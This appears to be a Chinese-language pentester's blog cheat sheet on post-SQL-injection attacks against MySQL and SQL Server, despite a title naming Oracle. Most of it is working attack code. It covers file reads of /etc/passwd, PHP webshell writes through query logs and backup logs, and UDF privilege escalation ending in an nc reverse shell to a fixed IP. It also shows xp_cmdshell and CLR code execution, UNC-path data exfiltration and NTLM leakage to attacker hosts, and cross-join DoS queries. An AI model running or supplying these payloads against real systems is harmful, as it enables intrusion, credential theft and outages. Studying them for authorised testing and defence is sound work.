[SQL注入之Oracle手工注入 - Saint_Michael - 博客园](https://www.cnblogs.com/miruier/p/17521338.html)

## mysql
一次只能执行一条

### 信息搜集
mysql一般手段是UDF提权(老版本还可以MOF)
需要有相当于root的权限, 而且`secure_file_priv`需要无限制

其中`secure_file_priv`是系统变量**默认情况下，`secure_file_priv` 是只读的，不能通过 SQL 语句（如 `SET GLOBAL`）动态修改。**

必须在配置文件中设置，并且重启 MySQL 才能生效。

mysql配置文件`secure_file_priv`项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用

可以通过以下命令查看是否有限制
```
show variables like 'secure_file_priv';
```
![](assets/sql2other/Pasted%20image%2020250509120309.png)

`secure_file_priv`的更改必须要在mysql配置文件`/etc/mysql/my.cnf`里改, 并且重启才生效, 所以其实是个很苛刻的条件
![](assets/sql2other/Pasted%20image%2020250510012820.png)

win在`"D:\Tools\phpstudy_pro\Extensions\MySQL5.7.26\my.ini"`  (如果没有这一项同样需要自己加上)
![](assets/sql2other/Pasted%20image%2020250510021002.png)

换句话说看得这里如果为空, 说明读写目录没有限制, 才有可能下一步
![](assets/sql2other/Pasted%20image%2020250510013120.png)
另外就算为空, Linux也可能对我们将要写入的`/usr/lib/mysql/plugin`插件目录进行保护
- `/usr/lib/mysql/plugin/` 目录通常用于存放 MySQL 插件（如 UDF），默认权限较为严格。
- MySQL 服务是以特定用户（通常是 `mysql:mysql`）运行的，因此该用户可能没权限



#### 其他信息搜集(mysql)
```
show variables like "%plugin%"  #寻找插件位置
show variables like "%basedir%" #确定mysql安装路径
select @@basedir;               #确定mysql安装路径 
show variables like "%compile%" #查看系统版本
```

#### 其他权限
1.2 CREATE权限、FILE权限（root用户默认拥有所有权限）。
2.1 INSERT权限、UPDATE权限、DELETE权限。
##### 查看当前数据库用户权限：

```
select * from mysql.user where user = substring_index(user(), '@', 1)\G;
```

### 信息外带
需要secure_file_prev为空
windows上有效
```sql
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt'; -- 信息泄露
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt')); -- 利用dns解析
LOAD DATA INFILE '\\\\192.168.0.100\\abc' INTO TABLE DATABASE.TABLE_NAME; -- NTLM凭证泄露
```


### 读文件
1. secure_file_priv为空时可以读取任意目录，否则只能读取特定目录，为NULL不能读取。mysql 5.6.34以后默认是NULL
2. 用户需要有数据库FILE权限
3. 同时mysql用户需要有目录和文件的权限。

```sql
select load_file("/etc/passwd") -- 路径可以用hex编码
-- 或
load data infile '/etc/passwd' into table file_contents;
select * from file_contents;
```
### 写文件
https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html

通过outfile和dumpfile，权限与读文件权限一致
```sql
select unhex("61") into outfile '/tmp/a';
-- 或
select unhex("61") into outfile '/tmp/a';
```
outfile 会对特殊字符转义并在最后加上换行符
一般写二进制文件用dumpfile

通过日志写, 会附带其他信息
需要：
1. SUPER or SYSTEM_VARIABLES_ADMIN 权限
2. 目录写权限
```sql
set global general_log = on;
set global general_log_file = '/var/www/html/info.php';
select '<?php phpinfo();?>';
set global general_log = off;

-- 减小文件大小，可以超时才写入日志
-- show global variables like '%long_query_time%' 默认10s
set global slow_query_log=1;
set global slow_query_log_file='/var/www/html/info.php';
select '<?php @eval($_POST[abc]);?>' or sleep(11);
```

### RCE

1. 查找插件库的路径
    
    `show variables like '%plugin%';`
    
    得到的结果为：

| Variable_name | Value                   |
| ------------- | ----------------------- |
| plugin_dir    | /usr/lib64/mysql/plugin |

这就是我们的恶意插件期望放入的目标路径

2. 找到sqlmap中对应操作系统数据库的UDF库文件
    
    `D:\Tools\sqlmap\data\udf\mysql\linux\64`下的`lib_mysqludf_sys.so_`文件
    `D:\Tools\sqlmap\data\udf\mysql\windows\64`下的`lib_mysqludf_sys.dll_`文件

用sqlmap自带的脚本进行解密
```sh
python extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
```
![](assets/sql2other/Pasted%20image%2020250306161328.png)
使用上面的命令，会在`lib_mysqludf_sys.dll_/lib_mysqludf_sys.so_`文件所在目录生成一个`lib_mysqludf_sys.dll/lib_mysqludf_sys.so`的文件，这个才是能被直接使用的udf提权dll文件。![](assets/sql2other/Pasted%20image%2020250704091807.png)
3. 把so文件导入进目标的`/tmp`目录

```
use mysql
create table xiaodi(line blob)

#往xiaodi 表中插入二进制的udf.so
insert into xiaodi values(load_file('/tmp/udf.so'));

#导出udf.so
select * from xiaodi into dumpfile '/usr/lib/mysql/plugin/udf.so';

#创建do_system 自定义函数
create function do_system returns integer soname 'udf.so';
select do_system('nc 192.168.139.141 6666 -e /bin/bash');

#如有错误可以删除函数
DROP FUNCTION IF EXISTS do_system;
```

注意：需要创建.so文件中存在的函数，可以使用十六进制编辑器打开.so文件，查看可以被创建的函数。

另外, 还可以这么把so文件写进去
1. 将so文件（UDF库文件）进行16进制编码
2. 将so文件的内容解码，写入到mysql插件库目录中
    `select unhex('so文件的16进制编码') into dumpfile '/usr/lib/mysql/plugin/xxx.so'
后面的步骤一样

不需要判断mysql的版本，直接查看路径，直接写so文件，Linux里面的文件是so文件。

但是由于前面说的对`/usr/lib/mysql/plugin/`目录的保护, 写入文件的时候大概率碰上
![](assets/sql2other/Pasted%20image%2020250510013451.png)

另外还有可能win系统下还没有创建这个目录
![](assets/sql2other/Pasted%20image%2020250510021357.png)

复现结果: (都是sql的root权限)
+ win mysql5.7: 在手动创建了![](assets/sql2other/Pasted%20image%2020250510021524.png)/lib/plugin目录后成功执行UDF
+ Linux mysql8.0, 没成功, lib/plugin插件有保护

### DoS
0权限
```sql
SELECT REPEAT('A', 10000) 
FROM information_schema.columns t1, 
     information_schema.columns t2, 
     information_schema.columns t3
```

## sqlserver
一次可以执行多条

https://www.cnblogs.com/hellobao/articles/17311647.html

### DoS
不需要权限
```sql
SELECT REPLICATE(CAST('A' AS VARCHAR(MAX)), 10000)
FROM master..spt_values t1, 
     master..spt_values t2, 
     master..spt_values t3;
```
### 列目录
需要sysadmin权限
```sql
exec xp_dirtree '/tmp',0,1;
```
第二个参数表示深度，0表示不限制，1表示1层，2表示2层
第三个参数1列出目录和文件，0表示仅目录

结果存到表里
```sql
insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

### 读文件
ADMINISTER BULK OPERATIONS权限（linux不支持）或sysadmin
```sql
SELECT * FROM OPENROWSET(   BULK '/etc/passwd',   SINGLE_CLOB ) AS x;
-- 或
create table files(line varchar(1024));
bulk insert files from '/tmp/flag';
select * from files;
```

### 写文件
db_backupoperator、建表、插入权限。或 db_owner权限
```sql
create database testdb; use testdb; create table testtb(aaa image);
ALTER DATABASE testdb SET RECOVERY FULL;
BACKUP DATABASE testdb TO DISK = '/tmp/testdb_full.bak' WITH INIT, COMPRESSION
backup log testdb to disk='/tmp/backloginit' with init -- 可以减小shell文件大小，可以省略
insert into testtb(aaa) values ('<?=system("whoami");?>') -- 0x616263

backup log testdb to disk='/tmp/shell.php'
-- 或
backup database testdb to disk = '/tmp/shell.php' with differential , format
```

### RCE

利用UDF加载外部函数，需要管理员权限，且能上传dll文件
```sql
EXEC sp_configure 'clr enabled', 1; RECONFIGURE; 

-- 上传dll

ALTER DATABASE <db_name> SET TRUSTWORTHY ON;

CREATE ASSEMBLY MyClrAssembly
FROM '/var/opt/mssql/MyFunctions.dll'
WITH PERMISSION_SET = SAFE;

CREATE FUNCTION dbo.HelloWorld(@name NVARCHAR(100))
RETURNS NVARCHAR(100)
AS EXTERNAL NAME MyClrAssembly.MyFunctions.HelloWorld;
GO

SELECT dbo.HelloWorld('hello');
GO
```

利用插件运行python代码, 见 https://learn.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver16
```sql
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
```

### 仅限windows的特性
https://learn.microsoft.com/en-us/sql/linux/sql-server-linux-editions-and-components-2025?view=sql-server-ver17#unsupported-features-and-services

#### 写文件

`sysadmin`权限才可以使用`sp_configure`
```sql
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures', 1;  -- 打开
RECONFIGURE WITH OVERRIDE; 

declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\inetpub\aa.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'__hello__' 
```

#### RCE
windows可以用`exec master..xp_cmdshell 'id'` 执行系统命令，linux上暂不支持

```sql
EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;
exec master..xp_cmdshell 'id'
```

#### SSRF
UNC路径，不能指定端口，可能用于NTLM hash泄露，信息外带（dns）
```sql
exec xp_dirtree '\\\\192.168.50.1\\abc',0,1; -- 支持dns
exec master..xp_fileexist '\\\\192.168.50.1\\abc';
```
还有一些类似的函数，都是用UNC
https://book.hacktricks.wiki/zh/pentesting-web/sql-injection/mssql-injection.html#fn_get_audit_file